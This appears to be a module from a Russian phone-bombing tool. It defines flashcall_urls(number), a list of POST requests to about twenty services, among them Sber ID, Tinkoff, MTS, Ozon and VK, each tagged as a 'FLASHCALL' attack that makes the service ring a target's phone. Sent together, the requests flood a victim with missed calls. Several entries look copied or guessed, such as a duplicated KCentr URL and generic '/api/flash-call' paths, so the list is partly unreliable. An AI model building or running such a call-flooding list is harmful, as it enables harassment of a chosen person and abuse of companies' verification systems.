"""
Flash Call (прозвон) — сервисы, которые звонят и сбрасывают:
звонок длится 1-2 секунды, приходит как пропущенный.
"""
def flashcall_urls(number):
    return [
        # KCentr — flash call авторизация
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'KCentr.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://kcentr.ru/user-service/api/desktop/v1/send-flash-cal',
            'data': {'phone': number},
        },
        # TashirPizza — flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'TashirPizza.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://kcentr.ru/user-service/api/desktop/v1/send-flash-cal',
            'data': {'phone': number},
        },
        # Shop.Hlebprom — flash call авторизация
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'Hlebprom.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://shop.hlebprom.ru/',
            'data': {'USER_LOGIN': number, 'AUTH_FORM': 'Y', 'TYPE': 'AUTH', 'Login': 'true'},
        },
        # Beeline — flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'Beeline.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://beelineru.ru/',
            'data': {'phone': number},
        },
        # DomConnect — flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'DomConnect.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://domconnect.ru/api.phone_info',
            'data': {'phone': number},
        },
        # Сбер ID — звонок для верификации
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'SberID.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://id.sber.ru/auth/flash-call',
            'data': {'phone': number},
        },
        # MTS ID — flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'MTS-ID.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://login.mts.ru/am/json/username/flashcall',
            'data': {'phone': number},
        },
        # Tele2 — flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'Tele2.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://msk.tele2.ru/api/flash-call',
            'data': {'phone': number},
        },
        # Яндекс ID — flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'Yandex-ID', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://id.yandex.ru/api/flash-call',
            'data': {'phone': number},
        },
        # Tinkoff flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'Tinkoff.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.tinkoff.ru/v1/flash_call',
            'data': {'phone': '+' + number},
        },
        # Ozon flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'Ozon.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.ozon.ru/api/flash-call',
            'data': {'phone': number},
        },
        # Wildberries flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'Wildberries.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.wildberries.ru/services/flash-call',
            'data': {'phone': number},
        },
        # DNS flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'DNS-Shop.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.dns-shop.ru/auth/auth/fast-authorization/',
            'data': {'phone': number},
        },
        # VK ID flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'VK-ID.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://id.vk.com/flash-call',
            'data': {'phone': number},
        },
        # VTB flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'VTB.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.vtb.ru/api/flash-call',
            'data': {'phone': number},
        },
        # AlfaBank flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'AlfaBank.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://alfabank.ru/api/flash-call',
            'data': {'phone': number},
        },
        # Avito flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'Avito.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.avito.ru/api/1/flash-call',
            'data': {'phone': number},
        },
        # ЦИАН flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'CIAN.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://cian.ru/api/flash-call',
            'data': {'phone': number},
        },
        # Youla flash call
        {
            'info': {'country': 'RU', 'attack': 'FLASHCALL', 'website': 'Youla.ru', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://youla.ru/web-api/flash-call',
            'data': {'phone': number},
        },
    ]
